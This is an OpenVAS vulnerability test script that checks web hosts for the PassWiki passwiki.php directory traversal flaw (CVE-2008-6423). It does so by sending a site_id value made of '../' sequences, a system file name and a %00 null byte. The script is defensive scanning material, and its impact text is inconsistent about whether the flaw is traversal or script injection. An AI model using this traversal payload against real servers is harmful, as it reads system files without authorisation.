###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_passwiki_dir_traversal_vuln.nasl 13543 2019-02-08 14:43:51Z cfischer $
#
# PassWiki passwiki.php Directory Traversal Vulnerability
#
# Authors:
# Nikita MR <rnikita@secpod.com>
#
# Copyright:
# Copyright (c) 2009 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900521");
  script_version("$Revision: 13543 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2009-03-20 07:08:52 +0100 (Fri, 20 Mar 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2008-6423");
  script_bugtraq_id(29455);
  script_name("PassWiki passwiki.php Directory Traversal Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/30496");
  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/5704");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attacker to inject arbitrary
  web script or HTML on a affected application.");
  script_tag(name:"affected", value:"PassWiki version prior to 0.9.17 on all platforms.");
  script_tag(name:"insight", value:"Input validation error in site_id parameter in passwiki.php file allows
  arbitrary code injection.");
  script_tag(name:"solution", value:"Upgrade to version 0.9.17 or later.");

  script_tag(name:"summary", value:"This host is running PassWiki and is prone to directory traversal
  vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("host_details.inc");
include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

pwikiPort = get_http_port(default:80);

if(!can_host_php(port:pwikiPort)){
  exit(0);
}

files = traversal_files();

foreach dir (make_list_unique("/passwiki", cgi_dirs(port:pwikiPort))) {

  if(dir == "/") dir = "";

  sndReq = http_get(item: dir + "/passwiki.php", port:pwikiPort);
  rcvRes = http_keepalive_send_recv(port:pwikiPort, data:sndReq);

  if("PassWiki" >!< rcvRes) {
    rcvRes = http_get_cache(item: dir + "/index.php", port:pwikiPort);
  }

  if("PassWiki" >< rcvRes) {

    foreach file ( keys( files ) ) {

      url = dir + "/passwiki.php?site_id=../../../" +
                  "../../../../../../../../../" + files[file] + "%00";
      if( http_vuln_check( port:pwikiPort, url:url, pattern:file  ) ) {
        report = report_vuln_url(port:pwikiPort, url:url);
        security_message(port:pwikiPort, data:report);
        exit(0);
      }
    }
  }
}

exit(99);